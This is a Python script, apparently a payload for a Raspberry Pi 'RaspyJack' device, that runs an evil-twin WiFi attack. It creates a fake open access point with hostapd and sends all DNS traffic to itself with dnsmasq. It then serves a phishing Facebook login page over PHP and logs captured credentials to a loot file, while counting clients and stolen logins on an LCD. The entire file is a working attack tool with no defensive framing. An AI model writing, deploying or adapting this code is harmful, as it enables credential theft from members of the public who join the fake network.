#!/usr/bin/env python3
"""
RaspyJack *payload* – **SE: Evil Twin (Facebook Login)**
=========================================================
A social engineering payload that creates a fake WiFi network and serves
a convincing fake Facebook login page to capture credentials.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
# ---------------------------- Third‑party libs ----------------------------
try:
    import RPi.GPIO as GPIO
    import LCD_1in44, LCD_Config
    from PIL import Image, ImageDraw, ImageFont
    HARDWARE_LIBS_AVAILABLE = True
except ImportError:
    HARDWARE_LIBS_AVAILABLE = False
    print("WARNING: RPi.GPIO or LCD drivers not available. UI will not function.", file=sys.stderr)

# --- CONFIGURATION ---
WIFI_INTERFACE = "wlan1" # TODO: Make configurable, e.g., via a menu or auto-detection
FAKE_AP_SSID = "Free Public WiFi" # Will be configurable
FAKE_AP_CHANNEL = "1" # Will be configurable
CAPTIVE_PORTAL_BASE_PATH = os.path.join("/root", "Raspyjack", "DNSSpoof", "sites")
CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, "phish_facebook") # Default to phish_facebook
LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt")
TEMP_CONF_DIR = "/tmp/raspyjack_eviltwin_facebook/"

# HTML file selection globals
current_html_file = "phish_facebook" # Default selected folder
html_files_list = []
html_file_index = 0

# --- GPIO & LCD ---
PINS = { "OK": 13, "KEY3": 16, "KEY1": 21, "KEY2": 20 } # Added KEY1, KEY2 for config

# ---------------------------------------------------------------------------
# 2) GPIO & LCD initialisation
# ---------------------------------------------------------------------------
if HARDWARE_LIBS_AVAILABLE:
    GPIO.setmode(GPIO.BCM)
    for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    FONT = ImageFont.load_default()
else:
    # Dummy objects if hardware libs are not available
    class DummyLCD:
        def LCD_Init(self, *args): pass
        def LCD_Clear(self): pass
        def LCD_ShowImage(self, *args): pass
    LCD = DummyLCD()
    WIDTH, HEIGHT = 128, 128
    class DummyGPIO:
        def setmode(self, *args): pass
        def setup(self, *args): pass
        def input(self, pin): return 1 # Simulate no button pressed
        def cleanup(self): pass
    GPIO = DummyGPIO()
    class DummyImageFont:
        def truetype(self, *args, **kwargs): return None
        def load_default(self): return None
    ImageFont = DummyImageFont()
    FONT_TITLE = None # Fallback to None if ImageFont is a dummy
    FONT = None # Fallback to None if ImageFont is a dummy

# --- Globals & Shutdown ---
running = True
attack_processes = {}
status_info = { "clients": 0, "credentials": 0 }

def cleanup(*_):
    global running
    if running:
        running = False
        for proc in attack_processes.values():
            try: os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            except: pass
        attack_processes.clear()
        subprocess.run("iptables -F; iptables -t nat -F", shell=True)
        subprocess.run("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
        subprocess.run(f"ifconfig {WIFI_INTERFACE} down; iwconfig {WIFI_INTERFACE} mode managed; ifconfig {WIFI_INTERFACE} up", shell=True)
        if os.path.exists(TEMP_CONF_DIR): subprocess.run(f"rm -rf {TEMP_CONF_DIR}", shell=True)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI & Core Logic ---
def draw_ui(screen_state="main", status: str = ""):
    if not HARDWARE_LIBS_AVAILABLE:
        print(f"UI State: {screen_state}")
        if screen_state == "main":
            print(f"SSID: {FAKE_AP_SSID}")
            print(f"Channel: {FAKE_AP_CHANNEL}")
            print(f"Portal: {current_html_file}")
        return

    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)

    if screen_state == "main":
        d.text((5, 5), "Evil Twin (Facebook)", font=FONT_TITLE, fill="#1877f2")
        d.line([(0, 22), (128, 22)], fill="#1877f2", width=1)

        d.text((5, 30), f"SSID: {FAKE_AP_SSID}", font=FONT, fill="white")
        d.text((5, 45), f"Channel: {FAKE_AP_CHANNEL}", font=FONT, fill="white")
        d.text((5, 60), f"Portal: {current_html_file}", font=FONT, fill="white")

        d.text((5, 80), "OK=Start | KEY1=Edit SSID", font=FONT, fill="cyan")
        d.text((5, 95), "KEY2=Edit Channel", font=FONT, fill="cyan")
        d.text((5, 110), "KEY3=Select Portal", font=FONT, fill="cyan")
    elif screen_state == "html_select":
        d.text((5, 5), "Select Portal", font=FONT_TITLE, fill="yellow")
        d.line([(0, 22), (128, 22)], fill="yellow", width=1)

        if not html_files_list:
            d.text((5, 40), "No HTML files found!", font=FONT, fill="red")
        else:
            for i, file_name in enumerate(html_files_list):
                display_name = file_name
                if len(display_name) > 16:
                    display_name = display_name[:13] + "..."
                
                text_color = "white"
                if i == html_file_index:
                    text_color = "lime"
                    d.rectangle([(0, 25 + i*15), (128, 25 + (i+1)*15)], fill="blue") # Highlight selected
                d.text((5, 25 + i*15), display_name, font=FONT, fill=text_color)
        d.text((5, 110), "UP/DOWN=Select | OK=Confirm", font=FONT, fill="cyan")
    elif screen_state == "attacking":
        status_color = "lime" if status == "ACTIVE" else "red"
        d.text((30, 25), status, font=FONT_TITLE, fill=status_color)
        d.text((5, 45), f"SSID: {FAKE_AP_SSID}", font=FONT, fill="white")
        d.text((5, 60), f"Clients: {status_info['clients']}", font=FONT, fill="yellow")
        d.text((5, 75), f"Creds: {status_info['credentials']}", font=FONT, fill="orange")
        d.text((5, 110), "Press KEY3 to Stop", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_file_selection_logic():
    global html_files_list, html_file_index, current_html_file, CAPTIVE_PORTAL_PATH, LOOT_FILE

    # Scan for directories in CAPTIVE_PORTAL_BASE_PATH
    html_files_list = [d for d in os.listdir(CAPTIVE_PORTAL_BASE_PATH) if os.path.isdir(os.path.join(CAPTIVE_PORTAL_BASE_PATH, d))]
    html_files_list.sort()

    if not html_files_list:
        draw_ui("html_select") # Draw empty list
        time.sleep(2)
        return

    # Set initial index to current_html_file if it exists in the list
    try:
        html_file_index = html_files_list.index(current_html_file)
    except ValueError:
        html_file_index = 0
        current_html_file = html_files_list[0]

    while running:
        draw_ui("html_select")
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "UP":
            html_file_index = (html_file_index - 1 + len(html_files_list)) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "DOWN":
            html_file_index = (html_file_index + 1) % len(html_files_list)
            current_html_file = html_files_list[html_file_index]
        elif btn == "OK":
            CAPTIVE_PORTAL_PATH = os.path.join(CAPTIVE_PORTAL_BASE_PATH, current_html_file)
            LOOT_FILE = os.path.join(CAPTIVE_PORTAL_PATH, "loot.txt") # Assuming loot.txt in each portal dir
            draw_ui("main") # Redraw main screen with new selection
            time.sleep(1)
            return
        elif btn == "KEY3": # Cancel
            return
        
        time.sleep(0.1)

def start_attack():
    subprocess.run("pkill wpa_supplicant; pkill dnsmasq; pkill hostapd; pkill php", shell=True, capture_output=True)
    os.makedirs(TEMP_CONF_DIR, exist_ok=True)
    hostapd_conf_path = os.path.join(TEMP_CONF_DIR, "hostapd.conf")
    with open(hostapd_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndriver=nl80211\\nssid={FAKE_AP_SSID}\\nhw_mode=g\\nchannel={FAKE_AP_CHANNEL}\\n")
    dnsmasq_conf_path = os.path.join(TEMP_CONF_DIR, "dnsmasq.conf")
    with open(dnsmasq_conf_path, "w") as f: f.write(f"interface={WIFI_INTERFACE}\\ndhcp-range=10.0.0.10,10.0.0.100,12h\\ndhcp-option=3,10.0.0.1\\ndhcp-option=6,10.0.0.1\\naddress=/#/10.0.0.1\\n")
    if os.path.exists(LOOT_FILE): os.remove(LOOT_FILE)
    
    # Bring down the interface, set to AP mode, and bring up with static IP
    subprocess.run(f"ifconfig {WIFI_INTERFACE} down", shell=True)
    subprocess.run(f"iwconfig {WIFI_INTERFACE} mode master", shell=True)
    subprocess.run(f"ifconfig {WIFI_INTERFACE} up 10.0.0.1 netmask 255.255.255.0", shell=True)
    
    # Start hostapd
    attack_processes['hostapd'] = subprocess.Popen(f"hostapd {hostapd_conf_path}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['hostapd'].poll() is not None:
        print(f"ERROR: hostapd failed to start. Stderr: {attack_processes['hostapd'].stderr.read().decode()}", file=sys.stderr)
        global running
        running = False
        return False

    # Start dnsmasq
    attack_processes['dnsmasq'] = subprocess.Popen(f"dnsmasq -C {dnsmasq_conf_path} -d", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['dnsmasq'].poll() is not None:
        print(f"ERROR: dnsmasq failed to start. Stderr: {attack_processes['dnsmasq'].stderr.read().decode()}", file=sys.stderr)
        global running
        running = False
        return False

    # Start php web server
    attack_processes['php'] = subprocess.Popen(f"php -S 10.0.0.1:80 -t {CAPTIVE_PORTAL_PATH}", shell=True, preexec_fn=os.setsid, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    time.sleep(2)
    if attack_processes['php'].poll() is not None:
        print(f"ERROR: PHP web server failed to start. Stderr: {attack_processes['php'].stderr.read().decode()}", file=sys.stderr)
        global running
        running = False
        return False
    
    return True

def monitor_status():
    while running:
        try:
            with open("/var/lib/misc/dnsmasq.leases", "r") as f: status_info["clients"] = len(f.readlines())
        except: status_info["clients"] = 0
        try:
            with open(LOOT_FILE, "r") as f: status_info["credentials"] = len(f.read().split("----")) -1
        except: status_info["credentials"] = 0
        time.sleep(5)

# --- Main Loop ---
try:
    is_attacking = False
    current_screen = "main" # New state variable for UI

    while running:
        if current_screen == "main":
            draw_ui("main")
            if GPIO.input(PINS["KEY3"]) == 0: # Select Portal
                current_screen = "html_select"
                time.sleep(0.2) # Debounce
            elif GPIO.input(PINS["OK"]) == 0: # Start Attack
                draw_ui("STARTING")
                if start_attack():
                    is_attacking = True
                    current_screen = "attacking"
                    threading.Thread(target=monitor_status, daemon=True).start()
                else:
                    draw_ui("FAILED")
                    time.sleep(3)
                    current_screen = "main" # Go back to main menu on failure
                time.sleep(0.2) # Debounce
        elif current_screen == "html_select":
            handle_file_selection_logic()
            current_screen = "main" # Return to main after selection
            time.sleep(0.2) # Debounce
        elif current_screen == "attacking":
            draw_ui("attacking", "ACTIVE")
            if GPIO.input(PINS["OK"]) == 0: # Stop Attack
                draw_ui("stopping")
                cleanup()
                is_attacking = False
                current_screen = "main"
                time.sleep(2) # Give time for cleanup message
            elif GPIO.input(PINS["KEY3"]) == 0: # Exit during attack
                cleanup()
                break
        
        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("SE Evil Twin (Facebook) payload finished.")
